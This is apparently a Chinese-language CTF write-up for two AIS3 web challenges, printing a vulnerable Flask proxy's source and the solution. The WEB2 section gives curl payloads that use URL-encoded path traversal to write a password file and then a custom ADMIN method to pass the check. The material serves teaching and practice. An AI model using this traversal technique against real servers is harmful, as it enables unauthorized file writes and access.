
## WEB1

header裡面有一個欄位是next 裡面的值是http method

讓他一直換不同的http method會拿到不同的回傳值

組合在一起就是flag

## WEB2


```
# -*- coding: utf-8 -*-
from flask import Flask
from flask_compress import Compress
from flask import request
import flask
import json
import uuid
import requests
import re
import os, os.path
import errno
import thread

listenPort=8787


def mkdir_p(path):
    try:
        os.makedirs(path)
    #except OSError as exc: # Python >2.5
    #    if exc.errno == errno.EEXIST and os.path.isdir(path):
    #        pass
    #    else: raise
    except:
        pass

def safe_open_w(path):
    ''' Open "path" for writing, creating any parent directories as needed.
    '''
    mkdir_p(os.path.dirname(path))
    return open(path, 'w')

def write_to_file(path,data):
    try:
        f=safe_open_w(path)
        f.write(data)
        f.close()
    except:
        pass

#from OpenSSL import SSL
#context = SSL.Context(SSL.SSLv23_METHOD)
#context.use_privatekey_file('server.key')
#context.use_certificate_file('server.crt')

app = Flask(__name__)
Compress(app)

def re_url(url):
    return url
def re_header(header):
    res_header={}
    for key, value in header.items():
        if key=='X-Platform-Host':
            continue
        res_header[key]=value
    res_header['Magic']='Boom'
    return res_header
def re_req_data(data):
    return data
def re_rsp_data(data):
    return data
def clean_url(url):
    url=url.replace('https://','').replace('http://','')
    p=url.find('?')
    if p != -1:
        url=url[:p]
    return url

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET'])
def get(path):
    if 'Magic' in request.headers:
        return "QAQ"
    url=re_url(request.url)
    print url
    header=re_header(request.headers)
    write_to_file(os.path.join('data','req_hd',clean_url(url)),str(request.headers))
    if url.find('error') != -1:
        return '{"resultCode":"success"}'
    r = requests.get(url, headers=header, allow_redirects=False)
    content = re_rsp_data(r.content)
    resp = flask.Response(content, status=r.status_code)
    for key, value in r.headers.iteritems():
        if key=="Transfer-Encoding" or key=="Content-Encoding" or key=="Via" or key=="Content-Length" or key=='X-Platform-Host':
            continue
        resp.headers[key]=value
    write_to_file(os.path.join('data','rsp_hd',clean_url(url)),str(resp.headers))
    write_to_file(os.path.join('data','rsp',clean_url(url)),str(content))
    print "GET" , len(content) , r.status_code
    return resp
@app.route('/', defaults={'path': ''}, methods=['POST'])
@app.route('/<path:path>', methods=['POST'])
def post(path):
    if 'Magic' in request.headers:
        return "QAQ"
    url=re_url(request.url)
    print url
    header=re_header(request.headers)
    write_to_file(os.path.join('data','req_hd',clean_url(url)),str(request.headers))
    data=request.get_data()
    data=re_req_data(data)
    write_to_file(os.path.join('data','req',clean_url(url)),str(data))
    if url.find('error') != -1:
        return '{"resultCode":"success"}'
    r = requests.post(url, headers=header, data=data, allow_redirects=False)
    content = re_rsp_data(r.content)
    resp = flask.Response(content, status=r.status_code)
    for key, value in r.headers.iteritems():
        if key=="Transfer-Encoding" or key=="Content-Encoding" or key=="Via" or key=="Content-Length" or key=='X-Platform-Host':
             continue
        resp.headers[key]=value
    write_to_file(os.path.join('data','rsp_hd',clean_url(url)),str(resp.headers))
    write_to_file(os.path.join('data','rsp',clean_url(url)),str(content))
    print "POST" , len(content) , r.status_code
    return resp

@app.route('/', defaults={'path': ''}, methods=['ADMIN'])
@app.route('/<path:path>', methods=['ADMIN'])
def admin(path):
    url = request.url
    p = url.rfind('/')
    if p != -1:
        url = url[p+1:]
    if not re.match('^\w+$',url):
	return url
    if os.path.isfile(os.path.join('password',url)):
        file=open(os.path.join('password',url), 'rb')
        content=file.read()
        file.close()
        if content == request.get_data():
            return "AIS3{this_is_not_the_flag}"
        else:
            return request.get_data()
    return "WTF"

if __name__ == '__main__':
    app.run(debug=False, host='127.0.0.1', port=listenPort, threaded=True)

```


用get方法可以寫檔 於是先請求 /../../../password/yiyu

之後再用admin method 請求 yiyu

post data 代入:
QAQ

flag就出來了

比賽當時沒解出這題，賽問詢問才知道我忘記url encode了

正確payload:

> curl -X GET http://127.0.0.1:8787/..%2f..%2f..%2fpassword/yiyu

> curl -X admin http://127.0.0.1:8787/yiyu --data "QAQ"

或是用burp就不用url encode了 我不知道我當時在堅持什麼...XD
